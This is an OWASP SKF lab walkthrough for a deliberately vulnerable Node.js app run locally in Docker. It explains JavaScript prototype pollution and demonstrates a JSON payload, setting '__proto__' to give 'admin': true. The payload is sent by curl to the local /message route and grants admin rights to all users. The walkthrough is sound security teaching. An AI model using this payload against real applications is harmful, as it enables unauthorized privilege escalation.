# Prototype Pollution

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:js-prototype-pollution
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:js-prototype-pollution
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

JavaScript is prototype-based: when new objects are created, they carry over the properties and methods of the prototype “object”, which contains basic functionalities such as toString, constructor and hasOwnProperty.

Object-based inheritance gives JavaScript the flexibility and efficiency that web programmers have come to love – but it also makes it vulnerable to tampering.

Malicious actors can make application-wide changes to all objects by modifying object, hence the name prototype pollution.

Interestingly, attackers don’t even need to directly modify object – they can access it through the ‘**proto**’ property of any JavaScript object. And once you make a change to object, it applies to all JavaScript objects in a running application, including those created after tampering.

Let's open the application, we have a login screen:

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/1.png)

Loggin in with user/user.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/2.png)

We see this user has no Admin privileges, also we have a feature to send a message to an admin. Let's use this and check the request

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/3.png)

Post request with email and username as expected.
We also noticed in the homepage a functionality to create a new user.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/5.png)

Login with the newly created user.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/6.png)

## Exploitation

Let's try our prototype pollution payload in the /message route.

```json
{
  "__proto__": { "admin": true },
  "email": "evil@proto.pollution",
  "msg": "You have been hacked!"
}
```

To make it easier let's put this payload in a file called evil.json.
Now lets use to curl to request the application with evil.json

```text
curl -H "content-type: application/json" -d@evil.json http://localhost:5000/message
```

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/4.png)

We get a response back from the server. Let's refresh the page to see if it worked.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/7.png)

Success! We now have a user with admin privileges!

If we create another user we see the new user will also have admin set to True.

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/8.png)

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/nodejs/Prototype-Pollution/9.png)

## Additional sources

{% embed url="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" %}
